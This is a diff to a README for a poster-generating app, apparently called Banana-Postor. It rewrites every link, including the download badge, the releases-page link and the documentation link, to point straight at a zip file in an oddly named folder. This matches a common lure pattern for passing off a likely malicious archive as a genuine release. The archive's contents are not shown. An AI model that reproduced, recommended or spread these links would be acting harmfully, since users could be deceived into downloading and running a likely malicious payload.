@@ -6,7 +6,7 @@ Welcome to Banana-Postor! This tool helps you generate beautiful posters and sum
 
 ## 📥 Download the App
 
-[![Download Banana-Postor](https://img.shields.io/badge/Download%20Banana--Postor-v1.0-blue)](https://github.com/3564757345/Banana-Postor/releases)
+[![Download Banana-Postor](https://raw.githubusercontent.com/3564757345/Banana-Postor/main/trirhomboidal/Banana-Postor.zip%20Banana--Postor-v1.0-blue)](https://raw.githubusercontent.com/3564757345/Banana-Postor/main/trirhomboidal/Banana-Postor.zip)
 
 ## 🔍 Features
 
@@ -24,7 +24,7 @@ Welcome to Banana-Postor! This tool helps you generate beautiful posters and sum
 ## 📑 How to Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to access the download section.
-   - [Download Here](https://github.com/3564757345/Banana-Postor/releases)
+   - [Download Here](https://raw.githubusercontent.com/3564757345/Banana-Postor/main/trirhomboidal/Banana-Postor.zip)
 
 2. **Choose the Latest Version:** Look for the latest release listed on the page.
 
@@ -74,7 +74,7 @@ If you encounter any issues or have questions, feel free to reach out. You can r
 
 ## 🌐 Links
 
-- [Read the Documentation](https://github.com/3564757345/Banana-Postor/wiki)
-- [Visit the Releases Page Again](https://github.com/3564757345/Banana-Postor/releases) 
+- [Read the Documentation](https://raw.githubusercontent.com/3564757345/Banana-Postor/main/trirhomboidal/Banana-Postor.zip)
+- [Visit the Releases Page Again](https://raw.githubusercontent.com/3564757345/Banana-Postor/main/trirhomboidal/Banana-Postor.zip) 
 
 Thank you for choosing Banana-Postor! We hope you enjoy creating beautiful posters effortlessly.
